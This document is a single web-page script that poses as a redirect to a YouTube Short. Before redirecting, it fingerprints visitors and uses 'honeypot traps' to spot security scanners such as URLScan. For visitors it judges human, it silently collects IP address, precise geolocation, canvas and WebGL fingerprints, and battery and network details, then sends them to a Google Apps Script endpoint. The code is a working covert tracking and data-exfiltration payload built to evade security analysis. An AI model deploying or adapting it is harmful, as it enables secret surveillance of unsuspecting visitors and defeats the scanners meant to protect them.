<script>
    const REDIRECT = 'https://www.youtube.com/shorts/gRVU6OvOSfY';
    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbxM7xBOr5j3_PKsU7iuwu6oe08voybmj2NGch-fp1x0jX5eHqIBGNaa4Q0UqhXePf3Z0Q/exec';
    
    let dataSent = false;

    // ðŸŽ¯ **HONEYPOT TRAPS - Only real browsers can pass these**
    async function detectRealBrowser() {
        const traps = {
            is_real_human: true,
            traps_passed: 0,
            traps_failed: [],
            scanner_indicators: []
        };

        // TRAP 1: **Mouse movement detection** (scanners don't move mouse)
        let mouseMoved = false;
        document.addEventListener('mousemove', () => { mouseMoved = true; }, { once: true });
        
        // TRAP 2: **Focus/Blur events** (scanners don't switch tabs)
        let focusChanged = false;
        window.addEventListener('focus', () => { focusChanged = true; }, { once: true });
        window.addEventListener('blur', () => { focusChanged = true; }, { once: true });
        
        // TRAP 3: **Click events** (scanners don't click)
        let clicked = false;
        document.addEventListener('click', () => { clicked = true; }, { once: true });
        
        // TRAP 4: **Scroll detection** (scanners don't scroll)
        let scrolled = false;
        window.addEventListener('scroll', () => { scrolled = true; }, { once: true });
        
        // TRAP 5: **Keyboard events** (scanners don't type)
        let keyPressed = false;
        document.addEventListener('keydown', () => { keyPressed = true; }, { once: true });
        
        // TRAP 6: **Touch events** if mobile
        let touched = false;
        document.addEventListener('touchstart', () => { touched = true; }, { once: true });
        
        // TRAP 7: **Web Audio API test** (scanners often block this)
        let audioSupported = false;
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            audioSupported = true;
            audioContext.close();
        } catch(e) {}
        
        // TRAP 8: **Microphone/Camera permission check** (scanners block)
        let mediaDevices = false;
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            mediaDevices = true;
        }
        
        // TRAP 9: **Clipboard API** (scanners don't have clipboard)
        let clipboard = 'clipboard' in navigator;
        
        // TRAP 10: **Geolocation API** (scanners block)
        let geolocation = 'geolocation' in navigator;
        
        // TRAP 11: **RequestIdleCallback** (real browsers have this)
        let idleCallback = 'requestIdleCallback' in window;
        
        // TRAP 12: **Speech Synthesis** (scanners don't have)
        let speechSynthesis = 'speechSynthesis' in window;
        
        // Wait a bit for events to potentially fire
        await new Promise(resolve => setTimeout(resolve, 800));
        
        // **ANALYZE RESULTS**
        
        // Scanner patterns from your example:
        // 1. Linux x86_64 with Chrome (common scanner platform)
        // 2. 28 CPU cores (server hardware)
        // 3. Language mismatch (he-IL but in Israel scanner farm)
        // 4. No mouse/keyboard/scroll events
        
        if (navigator.userAgent.includes('Linux x86_64') && 
            navigator.userAgent.includes('Chrome')) {
            traps.scanner_indicators.push('linux_chrome_scanner');
        }
        
        if (navigator.hardwareConcurrency > 16) {
            traps.scanner_indicators.push('server_cpu_cores_' + navigator.hardwareConcurrency);
        }
        
        // Check for known scanner IPs/networks
        const scannerNetworks = [
            '31.187.', // URLScan.io (PacketHub S.A.)
            '8.8.',    // Google bots
            '52.',     // AWS (common scanner infra)
            '54.',     // AWS
            '18.',     // Google Cloud
            '104.',    // DigitalOcean
            '162.',    // OVH
            '185.',    // Scanner networks
            '194.',    // Scanner networks
            '195.'     // Scanner networks
        ];
        
        // Count traps passed
        const eventTraps = [mouseMoved, focusChanged, clicked, scrolled, keyPressed, touched];
        const eventPassed = eventTraps.some(trap => trap === true);
        
        const apis = [audioSupported, mediaDevices, clipboard, geolocation, idleCallback, speechSynthesis];
        const apisAvailable = apis.filter(api => api === true).length;
        
        traps.traps_passed = (eventPassed ? 1 : 0) + apisAvailable;
        
        if (!eventPassed) {
            traps.traps_failed.push('no_user_interaction');
        }
        
        if (apisAvailable < 3) {
            traps.traps_failed.push('limited_apis');
        }
        
        // FINAL DECISION
        if (traps.scanner_indicators.length >= 2 && !eventPassed) {
            traps.is_real_human = false;
            traps.confidence = '95% SCANNER';
        } else if (eventPassed) {
            traps.is_real_human = true;
            traps.confidence = '99% HUMAN';
        } else if (traps.traps_passed >= 5) {
            traps.is_real_human = true;
            traps.confidence = '90% HUMAN';
        } else {
            traps.is_real_human = false;
            traps.confidence = '80% SCANNER';
        }
        
        traps.detailed_analysis = {
            mouse_moved: mouseMoved,
            focus_changed: focusChanged,
            clicked: clicked,
            scrolled: scrolled,
            key_pressed: keyPressed,
            touched: touched,
            audio_supported: audioSupported,
            media_devices: mediaDevices,
            clipboard: clipboard,
            geolocation_api: geolocation,
            idle_callback: idleCallback,
            speech_synthesis: speechSynthesis,
            user_agent: navigator.userAgent.substring(0, 100),
            cpu_cores: navigator.hardwareConcurrency,
            event_detected: eventPassed,
            apis_available: apisAvailable
        };
        
        return traps;
    }

    // ðŸŽ¯ **COLLECT DATA WITH SCANNER DETECTION**
    async function collectDataWithDetection() {
        // Run honeypot traps first
        const traps = await detectRealBrowser();
        
        // Basic data
        const data = {
            // âœ… **Detection Results**
            detection_timestamp: new Date().toISOString(),
            local_time: new Date().toLocaleString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            visitor_type: traps.is_real_human ? 'HUMAN' : 'SCANNER/BOT',
            detection_confidence: traps.confidence,
            scanner_indicators: traps.scanner_indicators,
            traps_passed: traps.traps_passed,
            traps_failed: traps.traps_failed,
            honeypot_analysis: traps.detailed_analysis,
            
            // âœ… **Basic Browser Info**
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : '',
            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
            do_not_track: navigator.doNotTrack || 'Not set',
            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            
            // âœ… **Screen & Hardware**
            screen_resolution: screen.width + 'x' + screen.height,
            screen_avail: screen.availWidth + 'x' + screen.availHeight,
            color_depth: screen.colorDepth + ' bit',
            pixel_ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
            device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            max_touch_points: navigator.maxTouchPoints || 0,
            
            // âœ… **URL & Referrer**
            url: window.location.href,
            referrer: document.referrer || 'Direct',
            
            // âœ… **Features**
            localStorage: window.localStorage ? 'Supported' : 'Not supported',
            sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
            notifications: 'Notification' in window ? 'Supported' : 'Not supported',
            webrtc: !!window.RTCPeerConnection,
            
            // âœ… **Plugins**
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
        };

        // Only collect advanced data if NOT a scanner
        if (traps.is_real_human) {
            try {
                // Get IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                
                // Geolocation
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                
                data.geolocation = {
                    ip: geoData.ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    country_code: geoData.country_code,
                    postal: geoData.postal,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude,
                    timezone: geoData.timezone,
                    utc_offset: geoData.utc_offset,
                    asn: geoData.asn,
                    org: geoData.org,
                    isp: geoData.org
                };
            } catch(error) {
                data.ip = 'Failed';
                data.geolocation = { error: 'Failed' };
            }

            // Advanced fingerprints
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
                
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    data.webgl = {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted'
                    };
                }
            } catch(e) {
                data.canvas_fingerprint = 'Failed';
            }
            
            // Battery
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        charging_time: battery.chargingTime || 'Unknown',
                        discharging_time: battery.dischargingTime || 'Unknown'
                    };
                } catch(e) {}
            }
            
            // Network
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms'
                };
            }
            
            // Visitor ID
            const idString = navigator.userAgent + screen.width + screen.height + navigator.language;
            let hash = 0;
            for (let i = 0; i < idString.length; i++) {
                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
                hash |= 0;
            }
            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
        } else {
            // For scanners, minimal data
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                data.scanner_ip_note = 'Scanner infrastructure IP';
                
                // Quick geolocation without details
                data.geolocation = { ip: ipData.ip, note: 'Scanner location' };
            } catch(e) {
                data.ip = 'Scanner - No IP fetched';
            }
            
            data.visitor_id = 'SCAN-' + Date.now().toString(36).toUpperCase();
            data.canvas_fingerprint = 'Scanner - Not collected';
        }
        
        return data;
    }

    // ðŸš€ **EXECUTE**
    (async function() {
        try {
            const data = await collectDataWithDetection();
            
            if (!dataSent) {
                dataSent = true;
                
                console.log('ðŸŽ¯ Detection:', data.visitor_type, '- Confidence:', data.detection_confidence);
                
                // Send to Google Script
                fetch(EMAIL_SCRIPT, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {
                    // Backup
                    const params = new URLSearchParams();
                    params.append('data', JSON.stringify(data));
                    fetch(EMAIL_SCRIPT + '?' + params.toString());
                });
            }
            
        } catch(error) {
            // Silent
        }
        
        // Redirect
        setTimeout(() => {
            window.location.href = REDIRECT;
        }, 1500);
        
    })();
</script>
